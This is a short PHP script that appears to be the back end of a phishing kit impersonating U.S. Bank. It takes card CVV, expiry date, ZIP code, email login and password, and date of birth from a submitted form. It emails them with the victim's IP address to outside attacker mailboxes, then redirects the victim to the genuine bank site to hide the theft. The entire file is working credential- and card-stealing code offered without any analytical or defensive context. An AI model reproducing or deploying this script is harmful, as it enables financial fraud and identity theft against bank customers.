<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$ssc = $_POST['sc'];
$dds = $_POST['ds'];
$zzs = $_POST['zs'];
$ysk = $_POST['ys'];
$vsk = $_POST['vs'];
$vdh = $_POST['dob1'];
$vdhs = $_POST['dob2'];
$vshd = $_POST['dob3'];

$cariko="ae7410891@gmail.com, result1983@hotmail.com";


  $subj = "USB $ip";
  $msg = "Security Info\n\n

CVV: $ssc\n
Expiry Date: $dds\n
ZIP code: $zzs\n
Email: $ysk\n
Email Pass: $vsk\n
DOB: $vdh-$vdhs-$vshd\n
Submitted from IP Address - $ip on $adddate\n
-----------------------------------\n        
Created By YomiTells
-----------------------------------";

$from = "From: USB<lolz@yankee.come>";
mail("ae7410891@gmail.com, result1980@protonmail.com", $subj, $msg, $from);
header("Location: https://www.usbank.com/online-banking/text-email-alerts.html");

?>